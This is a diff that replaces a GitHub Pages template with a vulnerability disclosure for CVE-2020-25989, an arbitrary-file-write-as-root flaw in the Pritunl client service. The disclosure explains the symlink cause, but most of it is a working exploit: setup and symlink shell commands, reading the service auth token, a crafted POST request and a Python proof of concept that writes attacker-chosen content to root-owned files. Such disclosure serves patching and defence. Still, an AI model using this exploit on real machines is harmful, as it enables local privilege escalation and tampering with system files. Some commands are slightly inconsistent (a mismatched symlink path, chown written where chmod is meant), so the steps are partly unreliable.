@@ -1,37 +1,93 @@
-## Welcome to GitHub Pages
+# Arbitrary File Write in Pritunl (CVE 2020-25989)
 
-You can use the [editor on GitHub](https://github.com/vkas-afk/vuln-disclosures/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+## Vulnerability
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Arbitrary file write as root in pritunl versions between 1.0.1116.6 and
+v1.2.2550.20. The pritunl-service writes to the following paths as root without checking if the file exists.
 
-### Markdown
+<ol>
+<li>/tmp/pritunl/{profile_id}</li>
+<li>/tmp/pritunl/{profile_id}-down.sh</li>
+<li>/tmp/pritunl/{profile_id}-up.sh</li>
+<li>/tmp/pritunl/{profile_id}-block.sh</li>
+<li>/tmp/pritunl/{profile_id}.auth</li>
+</ol>
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+the /tmp/pritunl/{profile_id}.auth path allows for fully controlled contents to be written to an arbitrary file on the host by placing a symlink in place of the file and submitting a malicious Profile POST request to the service with a crafted username and password. 
 
-```markdown
-Syntax highlighted code block
+The following steps outline how to setup the test data.
+```
+touch /tmp/root_test
+sudo chown 0600 /tmp/root_test
+```
+The following steps outline how to exploit the vulnerability.
+```
+mkdir /tmp/pritunl
+ln -s /tmp/root_test /tmp/123467.auth
+```
+An attacker can then get the auth token required to interact with the service by reading 
+```
+/var/run/pritunl.auth
+```
+The following example post request is then used to exploit the vulnerability.
+```
+POST /profile HTTP/1.1
+Auth-Key: Tp0JSp3iugTipiq2U9CpJcHuGkQGM3VvspS6gu6rtUfLCmOOlzl0gFkEFGiX67Zc
+User-Agent: pritunl
+Host: unix
+accept: application/json
+content-type: application/json
+content-length: 286
+Connection: close
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+{"id":"1234567","mode":"ovpn","org_id":"org_id_test","user_id":"user_id_test","server_id":"server_id_test","sync_token":"sync_token_test","sync_secret":"sync_secret_test","username":"username_test","password":"password_test","token_ttl":12345678,"reconnect":false,"timeout":false}
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+The strings "username_test" and "password_test" will be written to the file at the symlink (in this example that file is /tmp/root_test).
 
-### Jekyll Themes
+The contents of /tmp/root_test will now be.
+```
+username_test
+password_test
+```
+These issues stem from the following functions in /service/Profile/Profile.go
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/vkas-afk/vuln-disclosures/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+<ol>
+<li>write()</li>
+<li>writeDown()</li>
+<li>writeUp()</li>
+<li>writeBlock()</li>
+<li>writeAuth()</li>
+</ol>
+These functions call ioutil.WriteFile directly on the path that is generated without first checking if these files exist, allowing an attacker to create a symlink at /tmp/pritunl/{file} allowing for arbitrary file write as root.
 
-### Support or Contact
+## PoC
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Python PoC to interact with the pritunl-service and exploit the vulnerability 
+
+```
+import socket
+import os 
+
+os.mkdir("/tmp/pritunl")
+file_overwirte_path = "/tmp/root_test"
+os.symlink(file_overwirte_path, "/tmp/pritunl/1234567.auth")
+
+server_address = "/var/run/pritunl.sock"
+auth = open("/var/run/pritunl.auth", "r").read()
+
+payload = """POST /profile HTTP/1.1
+Auth-Key: """ + auth + """
+User-Agent: pritunl
+Host: unix
+accept: application/json
+content-type: application/json
+content-length: 286
+Connection: close
+
+{"id":"1234567","mode":"ovpn","org_id":"org_id_test","user_id":"user_id_test","server_id":"server_id_test","sync_token":"sync_token_test","sync_secret":"sync_secret_test","username":"root_file_write","password":"test","token_ttl":12345678,"reconnect":false,"timeout":false}
+"""
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+sock.connect(server_address)
+sock.sendall(payload.encode('utf-8'))
+```
